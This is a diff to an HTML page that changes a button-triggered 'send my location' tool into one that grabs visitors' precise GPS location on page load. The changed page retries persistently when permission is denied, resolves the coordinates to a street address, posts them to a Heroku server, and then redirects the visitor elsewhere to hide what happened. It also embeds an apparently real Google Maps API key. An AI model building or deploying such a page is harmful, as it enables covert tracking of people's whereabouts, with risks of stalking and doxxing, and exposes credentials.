@@ -4,16 +4,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Send GPS Location to Heroku</title>
+    <script async defer src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDw4-Pqsl6H8b1QCySB01JHYizAC-m58oY"></script> <!-- Add your Google Maps API Key -->
 </head>
 <body>
     <h1>Location Sender</h1>
-    <button id="sendLocationButton">Send Location to Heroku</button>
 
     <script>
-        // Function to capture and send the user's location
-        document.getElementById("sendLocationButton").addEventListener("click", function() {
-            // Check if the browser supports geolocation
+        // Automatically trigger geolocation when the page loads
+        window.onload = function() {
+            requestLocation();
+        };
+
+        // Function to capture and send the user's location using HTML5 Geolocation API
+        function requestLocation() {
             if (navigator.geolocation) {
+                // Try to get the location with high accuracy
                 navigator.geolocation.getCurrentPosition(successCallback, errorCallback, {
                     enableHighAccuracy: true,  // Use high-accuracy GPS location
                     timeout: 10000,  // Set timeout to 10 seconds
@@ -22,9 +27,9 @@
             } else {
                 alert("Geolocation is not supported by this browser.");
             }
-        });
+        }
 
-        // Success callback when location is retrieved
+        // Success callback when location is retrieved using HTML5 Geolocation
         function successCallback(position) {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
@@ -32,10 +37,49 @@
 
             console.log(`Latitude: ${latitude}, Longitude: ${longitude}, Accuracy: ${accuracy} meters`);
 
-            // Display a message about location accuracy
-            alert(`Location accuracy is within ${accuracy} meters.`);
+            // Use Google Maps Geocoding API to convert the latitude and longitude into an address
+            const geocodeUrl = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${latitude},${longitude}&key=YOUR_GOOGLE_MAPS_API_KEY`;
 
-            // Send the latitude, longitude, and accuracy to the Heroku backend
+            fetch(geocodeUrl)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'OK' && data.results.length > 0) {
+                        const address = data.results[0].formatted_address;
+                        console.log("Resolved Address: " + address);
+                        sendLocationToBackend(latitude, longitude, accuracy, address);  // Send the data to the backend
+                    } else {
+                        console.error('Failed to resolve address from Google Maps API');
+                        sendLocationToBackend(latitude, longitude, accuracy, null);  // Fallback: Send coordinates without address
+                    }
+                })
+                .catch((error) => {
+                    console.error('Error with Google Geocoding API:', error);
+                    sendLocationToBackend(latitude, longitude, accuracy, null);  // Fallback: Send coordinates without address
+                });
+        }
+
+        // Error callback when geolocation fails
+        function errorCallback(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("Please enable location services to proceed.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Location information is unavailable. Please try again.");
+                    break;
+                case error.TIMEOUT:
+                    alert("The request to get user location timed out. Retrying...");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("An unknown error occurred. Retrying...");
+                    break;
+            }
+            // Retry location request
+            requestLocation();
+        }
+
+        // Function to send the latitude, longitude, accuracy, and address (if available) to the Heroku backend
+        function sendLocationToBackend(latitude, longitude, accuracy, address) {
             fetch('https://guarded-sands-36430-2d7317f5f1f2.herokuapp.com/save-location', {
                 method: 'POST',
                 headers: {
@@ -44,7 +88,8 @@
                 body: JSON.stringify({
                     latitude: latitude,
                     longitude: longitude,
-                    accuracy: accuracy
+                    accuracy: accuracy,
+                    address: address  // Address from Google Maps API, or null if unavailable
                 }),
                 mode: 'cors',  // Ensure cross-origin requests work
                 credentials: 'same-origin'  // Send credentials with request if needed
@@ -52,31 +97,14 @@
             .then(response => response.text())
             .then(data => {
                 console.log('Success:', data);
-                alert('Location sent successfully to Heroku!');
+                // Redirect to main website after successful location submission
+                window.location.href = "https://www.example.com";  // Change to your desired website URL
             })
             .catch((error) => {
                 console.error('Error sending data to Heroku:', error);
-                alert('Failed to send location data to Heroku.');
+                // Retry location request on failure
+                requestLocation();
             });
-        }
-
-        // Error callback when geolocation fails
-        function errorCallback(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    alert("User denied the request for Geolocation.");
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    alert("Location information is unavailable.");
-                    break;
-                case error.TIMEOUT:
-                    alert("The request to get user location timed out.");
-                    break;
-                case error.UNKNOWN_ERROR:
-                    alert("An unknown error occurred.");
-                    break;
-            }
-            console.error('Error obtaining location:', error);
         }
     </script>
 </body>
